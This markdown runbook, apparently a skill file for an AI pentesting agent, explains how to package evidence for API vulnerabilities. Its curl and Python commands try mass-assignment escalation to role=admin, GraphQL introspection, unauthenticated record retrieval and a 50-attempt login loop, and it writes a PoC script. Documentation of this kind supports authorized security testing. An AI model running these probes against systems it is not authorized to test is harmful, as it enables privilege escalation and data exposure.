# API Evidence Collection Runbook

## Purpose
Standardized evidence packaging for API vulnerabilities.

## Variables
- `$TARGET_URL` — API base URL
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/api`
- `$API_TYPE` — one of: mass-assignment, graphql, auth-bypass, rate-limit

## Step 1 — Initialize Evidence Directory
```bash
EVIDENCE_DIR="$OUTDIR/evidence/api"
mkdir -p "$EVIDENCE_DIR/request" "$EVIDENCE_DIR/response" "$EVIDENCE_DIR/tool-versions"
```

## Step 2 — Capture Tool Versions
```bash
curl --version > "$EVIDENCE_DIR/tool-versions/curl.txt" 2>&1
python3 --version > "$EVIDENCE_DIR/tool-versions/python3.txt" 2>&1
jq --version > "$EVIDENCE_DIR/tool-versions/jq.txt" 2>&1
ffuf --version > "$EVIDENCE_DIR/tool-versions/ffuf.txt" 2>&1
```

## Step 3 — Capture Evidence by API Type

### Mass Assignment Evidence
```bash
curl -sk -v -X PATCH "$TARGET_URL/api/user/me" -H "Content-Type: application/json" -b "$COOKIE_JAR" -d '{"role":"admin"}' > "$EVIDENCE_DIR/request/01-mass-assignment-request.txt" 2>&1
curl -sk -X PATCH "$TARGET_URL/api/user/me" -H "Content-Type: application/json" -b "$COOKIE_JAR" -d '{"role":"admin"}' -o "$EVIDENCE_DIR/response/01-mass-assignment-response.json"

curl -sk -b "$COOKIE_JAR" "$TARGET_URL/api/me" -o "$EVIDENCE_DIR/response/02-verify-role.json"
python3 -c "import json; d=json.load(open('$EVIDENCE_DIR/response/02-verify-role.json')); print(f'Final role: {d.get(\"role\",\"unknown\")}')" > "$EVIDENCE_DIR/response/02-role-confirmed.txt"
```

### GraphQL Evidence
```bash
curl -sk -v "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' > "$EVIDENCE_DIR/request/03-gql-introspection-request.txt" 2>&1
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' -o "$EVIDENCE_DIR/response/03-gql-introspection-response.json"
python3 -c "import json; d=json.load(open('$EVIDENCE_DIR/response/03-gql-introspection-response.json')); types=d.get('data',{}).get('__schema',{}).get('types',[]); print(f'Exposed types: {len(types)}')" > "$EVIDENCE_DIR/response/03-gql-type-count.txt"
```

### Unauthenticated Access Evidence
```bash
curl -sk -v "$TARGET_URL/api/users" > "$EVIDENCE_DIR/request/04-unauth-access-request.txt" 2>&1
curl -sk "$TARGET_URL/api/users" -o "$EVIDENCE_DIR/response/04-unauth-access-response.json"
python3 -c "
import json
d=json.load(open('$EVIDENCE_DIR/response/04-unauth-access-response.json'))
if isinstance(d,list):
    print(f'Unauthenticated access: {len(d)} records returned')
    if d:
        print(f'First record keys: {list(d[0].keys())[:5]}')
elif isinstance(d,dict):
    print(f'Unauthenticated access: keys={list(d.keys())[:5]}')
" > "$EVIDENCE_DIR/response/04-unauth-summary.txt"
```

### Rate Limit Evidence
```bash
for i in $(seq 1 50); do
  curl -sk -o /dev/null -w "%{http_code}\n" "$TARGET_URL/api/login" -d "user=admin&pass=wrong"
done > "$EVIDENCE_DIR/response/05-rate-limit-test.txt"
UNIQUE_CODES=$(sort -u "$EVIDENCE_DIR/response/05-rate-limit-test.txt")
echo "Rate limit test result codes: $UNIQUE_CODES" > "$EVIDENCE_DIR/response/05-rate-limit-summary.txt"
```

## Step 4 — Create PoC Script
```bash
cat > "$EVIDENCE_DIR/poc.sh" << 'POCEOF'
#!/bin/bash
TARGET_URL="${1:-$TARGET_URL}"
COOKIE_JAR="${2:-cookies.txt}"
echo "PoC for $API_TYPE at $TARGET_URL"
curl -sk -b "$COOKIE_JAR" -X PATCH "$TARGET_URL/api/user/me" -H "Content-Type: application/json" -d '{"role":"admin"}'
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

## Step 5 — Evidence Manifest
```bash
cat > "$EVIDENCE_DIR/manifest.md" << MANIFESTEOF
# API Vulnerability Evidence Manifest
**Target:** $TARGET_URL
**API Type:** $API_TYPE
**Timestamp:** $(date -u +%Y-%m-%dT%H:%M:%SZ)

## Files
| File | Description |
|---|---|
| request/01-mass-assignment-request.txt | curl -v of privilege escalation attempt |
| response/01-mass-assignment-response.json | API response accepting role=admin |
| response/02-role-confirmed.txt | Confirmation of escalated role |
| request/03-gql-introspection-request.txt | curl -v of GraphQL introspection |
| response/03-gql-introspection-response.json | Full schema returned |
| request/04-unauth-access-request.txt | curl -v of unauthenticated access |
| response/04-unauth-access-response.json | Data returned without auth |
| response/05-rate-limit-test.txt | Rate limit test results |
| poc.sh | Reproducible PoC |
| tool-versions/* | Tool versions used |
MANIFESTEOF
echo "Manifest written to $EVIDENCE_DIR/manifest.md"
```

## Step 6 — Validate and Leak Check
```bash
[ -s "$EVIDENCE_DIR/response/01-mass-assignment-response.json" ] && echo "OK: mass assignment evidence" || echo "MISSING: mass assignment evidence"
[ -s "$EVIDENCE_DIR/poc.sh" ] && echo "OK: PoC script" || echo "MISSING: PoC script"
[ -s "$EVIDENCE_DIR/manifest.md" ] && echo "OK: manifest" || echo "MISSING: manifest"
echo "EVIDENCE PACKAGE COMPLETE"

gitleaks detect --source "$EVIDENCE_DIR" --no-git -v 2>&1 | tee "$EVIDENCE_DIR/leak-check.txt"
```

## Output Directory Structure
```
$OUTDIR/evidence/api/
├── manifest.md
├── poc.sh
├── request/
│   ├── 01-mass-assignment-request.txt
│   ├── 03-gql-introspection-request.txt
│   └── 04-unauth-access-request.txt
├── response/
│   ├── 01-mass-assignment-response.json
│   ├── 02-verify-role.json
│   ├── 02-role-confirmed.txt
│   ├── 03-gql-introspection-response.json
│   ├── 03-gql-type-count.txt
│   ├── 04-unauth-access-response.json
│   ├── 04-unauth-summary.txt
│   └── 05-rate-limit-test.txt
└── tool-versions/
    ├── curl.txt
    ├── python3.txt
    ├── jq.txt
    └── ffuf.txt
```

## Next Routing
- Evidence complete -> hand off to `.claude/skills/reporting/SKILL.md`
